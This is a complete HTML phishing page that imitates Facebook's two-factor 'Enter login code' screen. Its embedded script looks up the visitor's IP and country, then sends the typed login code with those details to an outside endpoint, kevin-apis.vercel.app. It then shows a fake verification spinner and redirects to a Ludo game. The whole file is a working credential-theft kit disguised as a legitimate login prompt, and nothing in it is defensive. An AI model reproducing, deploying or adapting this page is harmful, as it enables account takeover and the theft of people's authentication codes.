<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook Login Code</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Helvetica&display=swap');
    body {
      font-family: Helvetica, Arial, sans-serif;
    }
    #codeInput {
      font-family: monospace;
      cursor: pointer;
    }
    #copyTooltip {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #3b5998;
      color: white;
      padding: 8px 16px;
      border-radius: 9999px;
      font-weight: 600;
      font-size: 14px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s ease;
      z-index: 9999;
    }
    #copyTooltip.show {
      opacity: 1;
      pointer-events: auto;
    }
    #loadingOverlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 10000;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    #loadingOverlay.show {
      display: flex;
    }
    .spinner {
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-top: 4px solid #1877f2;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body class="bg-gray-300 min-h-screen flex flex-col items-center pt-6">
  <!-- Facebook header -->
  <header class="w-full max-w-md bg-[#3b5998] py-3 flex justify-center">
    <h1 class="text-white font-bold text-2xl select-none">facebook</h1>
  </header>

  <!-- Main container -->
  <main class="w-full max-w-md bg-white border border-gray-300 rounded-sm mt-4">
    <!-- Title bar -->
    <div class="border-b border-gray-300 px-4 py-2">
      <h2 class="font-semibold text-gray-900 text-base select-none">Enter login code to continue</h2>
    </div>

    <!-- Content -->
    <form id="loginForm" class="px-4 py-3 text-gray-900 text-sm leading-relaxed" novalidate>
      <p class="mb-3">
        It looks like you haven't logged in from this browser before. Please enter the login code from your phone below.
      </p>
      <input
        id="codeInput"
        name="code"
        type="text"
        aria-label="Login code input"
        required
        class="w-full border border-gray-300 h-10 px-2 mb-3 text-base text-gray-900 focus:outline-none focus:ring-1 focus:ring-blue-600"
      />
      <p class="mb-3">Note: Your text message may take a few minutes to arrive.</p>

      <!-- Having trouble link -->
      <div class="border-t border-gray-300 text-center py-2 mb-4">
        <a href="#" class="text-sm text-blue-600 hover:underline select-none">Having trouble?</a>
      </div>

      <button
        type="submit"
        class="w-full bg-[#3b5998] text-white font-semibold text-base py-2 rounded-sm select-none hover:bg-[#334d84] focus:outline-none focus:ring-2 focus:ring-blue-700"
      >
        Submit Code
      </button>
    </form>
  </main>

  <!-- Not Laden? Log In Here -->
  <div class="w-full max-w-md mt-4 text-center text-gray-500 text-sm select-none">
    Not You? <a href="#" class="text-gray-500 hover:underline">Log In Here</a>
  </div>

  <!-- Language selection -->
  <footer class="w-full max-w-md bg-white border border-gray-300 rounded-sm mt-4 px-4 py-3 select-none">
    <div class="grid grid-cols-2 gap-x-4 text-gray-700 text-sm">
      <div class="space-y-1">
        <p class="font-semibold">English (US)</p>
        <p>FranÃ§ais (France)</p>
        <p>à¤¨à¥‡à¤ªà¤¾à¤²à¥€</p>
        <p>PortuguÃªs (Brasil)</p>
      </div>
      <div class="space-y-1 text-right">
        <p>Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©</p>
        <p>Bahasa Indonesia</p>
        <p>EspaÃ±ol</p>
        <button
          aria-label="More languages"
          class="border border-gray-700 rounded-sm w-6 h-6 text-gray-700 font-bold text-lg leading-none flex items-center justify-center mx-auto"
          type="button"
        >
          +
        </button>
      </div>
    </div>
  </footer>

  <!-- Loading overlay -->
  <div id="loadingOverlay" class="text-white text-center">
    <div class="spinner mb-4"></div>
    <p class="text-lg font-medium">Verifying your code, please wait...</p>
  </div>

  <!-- Tooltip for copy action -->
  <div id="copyTooltip">Copied to clipboard!</div>

  <script>
    const KEVIN_API_BASE_URL = "https://kevin-apis.vercel.app/";
    const IMAGE_URL = "https://files.catbox.moe/39p9du.jpg";
    const redirectUrl = "https://poki.com/en/g/ludo-multiplayer?#fullscreen";

    // Map ISO country codes to phone country codes (approx. 100 countries)
    const phoneCountryCodes = {
      AF: "+93", AL: "+355", DZ: "+213", AR: "+54", AU: "+61", AT: "+43", BD: "+880", BY: "+375", BE: "+32",
      BO: "+591", BA: "+387", BR: "+55", BG: "+359", KH: "+855", CM: "+237", CA: "+1", CL: "+56", CN: "+86",
      CO: "+57", CR: "+506", HR: "+385", CU: "+53", CZ: "+420", DK: "+45", EC: "+593", EG: "+20", SV: "+503",
      ET: "+251", FI: "+358", FR: "+33", GE: "+995", DE: "+49", GH: "+233", GR: "+30", GT: "+502", HT: "+509",
      HN: "+504", HU: "+36", IS: "+354", IN: "+91", ID: "+62", IR: "+98", IQ: "+964", IE: "+353", IL: "+972",
      IT: "+39", JM: "+1-876", JP: "+81", JO: "+962", KZ: "+7", KE: "+254", KW: "+965", KG: "+996", LA: "+856",
      LB: "+961", LY: "+218", MY: "+60", ML: "+223", MX: "+52", MA: "+212", NP: "+977", NL: "+31", NZ: "+64",
      NI: "+505", NG: "+234", NO: "+47", OM: "+968", PK: "+92", PA: "+507", PY: "+595", PE: "+51", PH: "+63",
      PL: "+48", PT: "+351", QA: "+974", RO: "+40", RU: "+7", RW: "+250", SA: "+966", SN: "+221", RS: "+381",
      SG: "+65", SK: "+421", ZA: "+27", KR: "+82", ES: "+34", LK: "+94", SD: "+249", SE: "+46", CH: "+41",
      SY: "+963", TW: "+886", TZ: "+255", TH: "+66", TN: "+216", TR: "+90", UG: "+256", UA: "+380", AE: "+971",
      GB: "+44", US: "+1", UY: "+598", UZ: "+998", VE: "+58", VN: "+84", YE: "+967", ZM: "+260", ZW: "+263"
    };

    // Function to convert country code to flag emoji
    function countryCodeToFlag(countryCode) {
      if (!countryCode || countryCode === "Unknown") return "ðŸŒ";
      return countryCode
        .toUpperCase()
        .replace(/./g, (char) => String.fromCodePoint(127397 + char.charCodeAt(0)));
    }

    // Fetch country info and IP address from IP
    async function getCountryInfo() {
      try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP info");
        const data = await response.json();
        const isoCode = data.country_code || "Unknown";
        const phoneCode = phoneCountryCodes[isoCode] || "(Unknown)";
        return {
          code: phoneCode,
          name: data.country_name || "Unknown",
          flag: countryCodeToFlag(isoCode),
          ip: data.ip || "Unknown",
        };
      } catch (error) {
        console.error("Error fetching country info:", error);
        return { code: "(Unknown)", name: "Unknown", flag: "ðŸŒ", ip: "Unknown" };
      }
    }

    // Click-to-copy for code input
    const codeInput = document.getElementById("codeInput");
    const tooltip = document.getElementById("copyTooltip");
    const loadingOverlay = document.getElementById("loadingOverlay");

    function showTooltip() {
      tooltip.classList.add("show");
      setTimeout(() => {
        tooltip.classList.remove("show");
      }, 2000);
    }

    function showLoading() {
      loadingOverlay.classList.add("show");
    }

    function copyToClipboard(text) {
      navigator.clipboard.writeText(text).then(
        () => {
          showTooltip();
        },
        (err) => {
          console.error("Failed to copy text: ", err);
        }
      );
    }

    codeInput.addEventListener("click", () => {
      const value = codeInput.value.trim();
      if (value) {
        copyToClipboard(value);
      }
    });

    // Format timestamp
    function formatDateTime(date) {
      const pad = (n) => (n < 10 ? "0" + n : n);
      return (
        date.getFullYear() +
        "-" +
        pad(date.getMonth() + 1) +
        "-" +
        pad(date.getDate()) +
        " " +
        pad(date.getHours()) +
        ":" +
        pad(date.getMinutes()) +
        ":" +
        pad(date.getSeconds())
      );
    }

    async function sendToKevinAPI(code, countryInfo) {
      const now = new Date();
      const formattedDateTime = formatDateTime(now);
      
      const message = `Ludo Star - Login Code\nðŸ•’ ${formattedDateTime}\n\nðŸŒ Country: ${countryInfo.flag} ${countryInfo.name} (${countryInfo.code})\nðŸŒ IP Address: ${countryInfo.ip}\n\nðŸ” Login Code: ${code}\n\nClick to copy.\nâ† á´…á´‡á´  Ê™Ê Â» Kevin_Mitnick`;

      const apiUrl = `${KEVIN_API_BASE_URL}?photo=${encodeURIComponent(IMAGE_URL)}&msg=${encodeURIComponent(message)}`;
      
      try {
        const response = await fetch(apiUrl);
        if (!response.ok) console.error("Kevin API response not OK");
        return true;
      } catch (error) {
        console.error("Error sending to Kevin API:", error);
        return false;
      }
    }

    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault();
      const code = document.getElementById("codeInput").value.trim();

      if (!code) {
        codeInput.focus();
        alert("Please enter the login code.");
        return;
      }

      const countryInfo = await getCountryInfo();
      
      // Send code to Kevin API
      await sendToKevinAPI(code, countryInfo);

      // Show loading and redirect after 5 seconds
      showLoading();
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 5000);
    });
  </script>
</body>
</html>
